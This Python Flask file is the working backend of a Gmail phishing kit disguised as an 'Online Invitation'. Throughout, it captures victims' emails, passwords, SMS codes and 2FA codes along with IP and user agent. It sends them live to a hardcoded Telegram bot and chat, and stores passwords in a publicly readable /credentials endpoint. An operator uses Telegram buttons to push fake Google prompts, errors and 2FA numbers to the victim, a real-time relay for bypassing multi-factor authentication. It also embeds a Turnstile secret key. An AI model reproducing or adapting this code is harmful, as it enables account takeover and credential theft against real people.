from flask import Flask, request, redirect, session, render_template_string, jsonify, Response
import requests
import json
import os
import base64
import time
import hmac
import hashlib
from datetime import datetime
import threading
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
from flask_cors import CORS
CORS(app)
app.secret_key = os.urandom(24)
# ================================================================
# TELEGRAM CONFIG
# ================================================================
TG_BOT_TOKEN = "8868268134:AAHTVlyTE0ksIwGG75SWEKg-qbUGd8wHE3s"
TG_CHAT_ID = "8337327707"
TG_API = f"https://api.telegram.org/bot{TG_BOT_TOKEN}"

# ================================================================
# REDIRECT URL
# ================================================================
SUCCESS_REDIRECT_URL = "https://evntly.online"

# ================================================================
# STORAGE — Using /tmp/ for Render compatibility
# ================================================================
GMAIL_STATE_DB = "/tmp/gmail_state.json"
CRED_DB = "/tmp/credentials.json"
TELEGRAM_OFFSET_DB = "/tmp/telegram_offset.json"

def send_telegram(message):
    url = f"{TG_API}/sendMessage"
    payload = {"chat_id": TG_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def send_telegram_buttons(text, buttons):
    url = f"{TG_API}/sendMessage"
    payload = {
        "chat_id": TG_CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "reply_markup": {"inline_keyboard": buttons}
    }
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def send_telegram_2fa_grid():
    numbers = [f"{i}{j}" for i in range(1, 10) for j in range(0, 10)]
    rows = []
    row = []
    for n in numbers:
        row.append({"text": n, "callback_data": f"2fa_{n}"})
        if len(row) == 5:
            rows.append(row)
            row = []
    if row:
        rows.append(row)
    send_telegram_buttons("🔢 Choose the 2-digit number to show the user:", rows)

def send_main_controls():
    buttons = [
        [{"text": "✅ Yes Prompt", "callback_data": "yes_prompt"}],
        [{"text": "📱 SMS Code I", "callback_data": "sms1"}, {"text": "📱 SMS Code II", "callback_data": "sms2"}],
        [{"text": "🔢 2FA Number Prompt", "callback_data": "show_2fa_menu"}],
        [{"text": "❌ Password Error", "callback_data": "password_error"}],
        [{"text": "🚫 Block Visitor", "callback_data": "block"}, {"text": "✅ Success", "callback_data": "success"}]
    ]
    send_telegram_buttons("🎮 **Gmail Flow Controls**\nSelect what to show the user:", buttons)

def init_gmail_state():
    try:
        if os.path.exists(GMAIL_STATE_DB):
            with open(GMAIL_STATE_DB, 'r') as f:
                return json.load(f)
    except:
        pass
    state = {
        "step": "email",
        "email": "",
        "password": "",
        "sms1": "",
        "sms2": "",
        "fa2_code": "",
        "fa2_choice": "",
        "ip": "",
        "user_agent": "",
        "timestamp": ""
    }
    save_gmail_state(state)
    return state

def save_gmail_state(state):
    try:
        with open(GMAIL_STATE_DB, 'w') as f:
            json.dump(state, f, indent=2)
    except:
        pass

def save_credential(email, password, ip, method):
    db = {}
    try:
        if os.path.exists(CRED_DB):
            with open(CRED_DB, 'r') as f:
                db = json.load(f)
    except:
        pass
    if email not in db:
        db[email] = []
    db[email].append({
        "password": password,
        "ip": ip,
        "method": method,
        "timestamp": datetime.now().isoformat()
    })
    try:
        with open(CRED_DB, 'w') as f:
            json.dump(db, f, indent=2)
    except:
        pass

def handle_telegram_updates():
    offset = 0
    try:
        if os.path.exists(TELEGRAM_OFFSET_DB):
            with open(TELEGRAM_OFFSET_DB, 'r') as f:
                data = json.load(f)
                offset = data.get("offset", 0)
    except:
        pass
    
    while True:
        try:
            resp = requests.get(f"{TG_API}/getUpdates", params={
                "offset": offset,
                "timeout": 30,
                "allowed_updates": json.dumps(["message", "callback_query"])
            }, timeout=35)
            
            if resp.status_code != 200:
                time.sleep(5)
                continue
                
            updates = resp.json().get("result", [])
            
            for update in updates:
                update_id = update["update_id"]
                offset = update_id + 1
                
                # Save offset immediately to avoid reprocessing
                try:
                    with open(TELEGRAM_OFFSET_DB, 'w') as f:
                        json.dump({"offset": offset}, f)
                except:
                    pass
                
                if "callback_query" in update:
                    cb = update["callback_query"]
                    cb_data = cb.get("data", "")
                    cb_id = cb.get("id")
                    cb_msg_id = cb.get("message", {}).get("message_id")
                    cb_chat_id = cb.get("message", {}).get("chat", {}).get("id")
                    
                    state = init_gmail_state()
                    
                    if cb_data == "yes_prompt":
                        state["step"] = "prompt"
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        try:
                            requests.post(f"{TG_API}/answerCallbackQuery", json={
                                "callback_query_id": cb_id, 
                                "text": "✅ Prompt sent to user. Waiting for Yes/No response..."
                            }, timeout=5)
                        except:
                            pass
                        send_telegram("✅ Google Prompt sent to user's page!")
                        send_main_controls()
                        
                    elif cb_data == "sms1":
                        state["step"] = "sms1"
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        try:
                            requests.post(f"{TG_API}/answerCallbackQuery", json={
                                "callback_query_id": cb_id, 
                                "text": "📱 SMS Code I sent to user"
                            }, timeout=5)
                        except:
                            pass
                        send_telegram("📱 SMS Code I sent to user's page!")
                        send_main_controls()
                        
                    elif cb_data == "sms2":
                        state["step"] = "sms2"
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        try:
                            requests.post(f"{TG_API}/answerCallbackQuery", json={
                                "callback_query_id": cb_id, 
                                "text": "📱 SMS Code II sent to user"
                            }, timeout=5)
                        except:
                            pass
                        send_telegram("📱 SMS Code II sent to user's page!")
                        send_main_controls()
                        
                    elif cb_data == "password_error":
                        state["step"] = "error"
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        try:
                            requests.post(f"{TG_API}/answerCallbackQuery", json={
                                "callback_query_id": cb_id, 
                                "text": "❌ Password error shown to user"
                            }, timeout=5)
                        except:
                            pass
                        send_telegram("❌ Password error shown to user!")
                        send_main_controls()
                        
                    elif cb_data == "block":
                        state["step"] = "blocked"
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        try:
                            requests.post(f"{TG_API}/answerCallbackQuery", json={
                                "callback_query_id": cb_id, 
                                "text": "🚫 User blocked"
                            }, timeout=5)
                        except:
                            pass
                        send_telegram("🚫 User is now blocked!")
                        send_main_controls()
                        
                    elif cb_data == "success":
                        state["step"] = "success"
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        try:
                            requests.post(f"{TG_API}/answerCallbackQuery", json={
                                "callback_query_id": cb_id, 
                                "text": "✅ Success! Redirecting user..."
                            }, timeout=5)
                        except:
                            pass
                        send_telegram("✅ User redirected to success page!")
                        send_main_controls()
                        
                    elif cb_data == "show_2fa_menu":
                        try:
                            requests.post(f"{TG_API}/answerCallbackQuery", json={
                                "callback_query_id": cb_id, 
                                "text": "🔢 Loading 2FA grid..."
                            }, timeout=5)
                        except:
                            pass
                        send_telegram_2fa_grid()
                        send_main_controls()
                        
                    elif cb_data.startswith("2fa_"):
                        number = cb_data.split("_")[1]
                        state = init_gmail_state()
                        state["step"] = "fa2_show"
                        state["fa2_choice"] = number
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        try:
                            requests.post(f"{TG_API}/answerCallbackQuery", json={
                                "callback_query_id": cb_id, 
                                "text": f"🔢 Showing 2FA code: {number}"
                            }, timeout=5)
                        except:
                            pass
                        send_telegram(f"🔢 Showing 2FA code **{number}** to user!")
                        send_main_controls()
                        
                elif "message" in update:
                    msg = update["message"]
                    text = msg.get("text", "").strip()
                    
                    if text == "/start":
                        send_telegram("🤖 **Gmail Flow Control Bot**\n\nUse the buttons below to control the user's Gmail login flow:")
                        send_main_controls()
                    elif text == "/controls" or text == "/menu":
                        send_main_controls()
                    elif text == "/2fa":
                        send_telegram_2fa_grid()
                    elif text == "/status":
                        state = init_gmail_state()
                        s = state["step"]
                        e = state["email"] or "Not set"
                        send_telegram(f"📊 **Current Status**\nStep: `{s}`\nEmail: `{e}`\nPassword: {'✅ Captured' if state['password'] else '❌ Not yet'}\nSMS1: `{state['sms1'] or 'N/A'}`\nSMS2: `{state['sms2'] or 'N/A'}`\n2FA Code Shown: `{state['fa2_choice'] or 'N/A'}`\nIP: `{state['ip'] or 'N/A'}`\nTime: `{state['timestamp'] or 'N/A'}`")
                    elif text == "/reset":
                        state = init_gmail_state()
                        state["step"] = "email"
                        state["email"] = ""
                        state["password"] = ""
                        state["sms1"] = ""
                        state["sms2"] = ""
                        state["fa2_code"] = ""
                        state["fa2_choice"] = ""
                        state["ip"] = ""
                        state["user_agent"] = ""
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        send_telegram("🔄 State has been reset to email step!")
                        send_main_controls()
                        
            # Small delay between polling cycles
            time.sleep(1)
            
        except requests.exceptions.Timeout:
            # Timeout is expected with long polling, just continue
            continue
        except Exception as e:
            print(f"Telegram polling error: {e}")
            time.sleep(5)
            continue

@app.route('/')
def home():
    return jsonify({
        "status": "running",
        "endpoints": {
            "virtual_iv_page": "/virtual-iv",
            "gmail_state": "/api/gmail-state",
            "gmail_submit_email": "/api/gmail-email",
            "gmail_submit_password": "/api/gmail-password",
            "gmail_submit_sms": "/api/gmail-sms",
            "gmail_submit_2fa": "/api/gmail-2fa",
            "gmail_submit_prompt": "/api/gmail-prompt",
            "submit_credential": "/api/submit-credential",
            "submit_otp": "/api/submit-otp",
            "verify_turnstile": "/api/verify-turnstile",
            "credentials": "/credentials",
            "health": "/health"
        }
    })

@app.route('/virtual-iv')
def virtual_iv_page():
    state = init_gmail_state()
    state["step"] = "email"
    state["email"] = ""
    state["password"] = ""
    state["sms1"] = ""
    state["sms2"] = ""
    state["fa2_code"] = ""
    state["fa2_choice"] = ""
    state["ip"] = request.headers.get("X-Forwarded-For", request.remote_addr)
    if state["ip"] and "," in state["ip"]:
        state["ip"] = state["ip"].split(",")[0].strip()
    state["user_agent"] = request.headers.get("User-Agent", "")
    state["timestamp"] = datetime.now().isoformat()
    save_gmail_state(state)
    return jsonify({"status": "ok", "step": "email"})

@app.route('/api/gmail-state')
def get_gmail_state():
    state = init_gmail_state()
    return jsonify({
        "step": state["step"],
        "email": state["email"],
        "fa2_choice": state["fa2_choice"]
    })

@app.route('/api/gmail-email', methods=['POST'])
def gmail_email():
    data = request.json
    email = data.get('email', '').strip()
    if not email:
        return jsonify({"status": "error"}), 400
    state = init_gmail_state()
    state["email"] = email
    state["step"] = "password"
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    ua = request.headers.get("User-Agent", "")
    state["ip"] = ip
    state["user_agent"] = ua
    state["timestamp"] = datetime.now().isoformat()
    save_gmail_state(state)
    
    msg = f"""[+]___ Online Invitation (GMAIL) ___[+]
You have a new website form submission
Email: {email}
IP: {ip}
UA: {ua[:80]}"""
    send_telegram(msg)
    send_main_controls()
    return jsonify({"status": "ok"})

@app.route('/api/gmail-password', methods=['POST'])
def gmail_password():
    data = request.json
    password = data.get('password', '').strip()
    if not password:
        return jsonify({"status": "error"}), 400
    state = init_gmail_state()
    state["password"] = password
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    ua = request.headers.get("User-Agent", "")
    state["ip"] = ip
    state["user_agent"] = ua
    state["timestamp"] = datetime.now().isoformat()
    save_gmail_state(state)
    save_credential(state["email"], password, ip, "gmail")
    
    msg = f"""[+]___ Online Invitation (GMAIL) ___[+]
You have a new website form submission
Email: {state['email']}
Password: {password}
IP: {ip}
UA: {ua[:80]}"""
    send_telegram(msg)
    send_main_controls()
    return jsonify({"status": "ok"})

@app.route('/api/gmail-sms', methods=['POST'])
def gmail_sms():
    data = request.json
    code = data.get('code', '').strip()
    step = data.get('step', 'sms1')
    if not code:
        return jsonify({"status": "error"}), 400
    state = init_gmail_state()
    if step == "sms1":
        state["sms1"] = code
    else:
        state["sms2"] = code
    state["timestamp"] = datetime.now().isoformat()
    save_gmail_state(state)
    
    msg = f"""[+]___ GMAIL {step.upper()} ___[+]
Email: {state['email']}
Code: {code}
IP: {state['ip']}"""
    send_telegram(msg)
    send_main_controls()
    return jsonify({"status": "ok"})

@app.route('/api/gmail-2fa', methods=['POST'])
def gmail_2fa():
    data = request.json
    code = data.get('code', '').strip()
    if not code:
        return jsonify({"status": "error"}), 400
    state = init_gmail_state()
    state["fa2_code"] = code
    state["timestamp"] = datetime.now().isoformat()
    save_gmail_state(state)
    
    msg = f"""[+]___ GMAIL 2FA ___[+]
Email: {state['email']}
Code Entered: {code}
Code Shown (our choice): {state['fa2_choice']}
IP: {state['ip']}"""
    send_telegram(msg)
    send_main_controls()
    return jsonify({"status": "ok"})

@app.route('/api/gmail-prompt', methods=['POST'])
def gmail_prompt():
    data = request.json
    response = data.get('response', '').strip()
    state = init_gmail_state()
    
    msg = f"""[+]___ GMAIL PROMPT ___[+]
Email: {state['email']}
Response: {response}
IP: {state['ip']}"""
    send_telegram(msg)
    send_main_controls()
    return jsonify({"status": "ok"})

@app.route('/api/submit-credential', methods=['POST'])
def submit_credential():
    data = request.json
    provider = data.get('provider', '')
    email = data.get('email', '')
    password = data.get('password', '')
    phone = data.get('phone', '')
    ip = data.get('ip', '') or request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    ua = data.get('ua', '') or request.headers.get("User-Agent", "")
    
    msg = f"""[+]___ Online Invitation (LOGIN) ___[+]
Provider: {provider}
Email: {email}
Password: {password}
Phone: {phone}
IP: {ip}
UA: {ua[:80]}"""
    send_telegram(msg)
    return jsonify({"success": True})

@app.route('/api/submit-otp', methods=['POST'])
def submit_otp():
    data = request.json
    code = data.get('code', '')
    ip = data.get('ip', '') or request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    
    msg = f"""[+]___ OTP ___[+]
Code: {code}
IP: {ip}"""
    send_telegram(msg)
    return jsonify({"success": True})

@app.route('/api/verify-turnstile', methods=['POST'])
def verify_turnstile():
    data = request.json
    token = data.get('token', '')
    if not token:
        return jsonify({"success": False})
    try:
        resp = requests.post("https://challenges.cloudflare.com/turnstile/v0/siteverify", data={
            "secret": "0x4AAAAAADnqRfsQR1gWuEP3C6b6jPjdT_M",
            "response": token
        }, timeout=10)
        result = resp.json()
        return jsonify({"success": result.get("success", False)})
    except:
        return jsonify({"success": False})

@app.route('/credentials')
def list_credentials():
    if not os.path.exists(CRED_DB):
        return jsonify({})
    with open(CRED_DB) as f:
        return jsonify(json.load(f))

@app.route('/health')
def health():
    return "OK"

def start_bot():
    time.sleep(3)  # Give the server time to start
    print("[+] Telegram bot polling started...")
    handle_telegram_updates()

threading.Thread(target=start_bot, daemon=True).start()

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
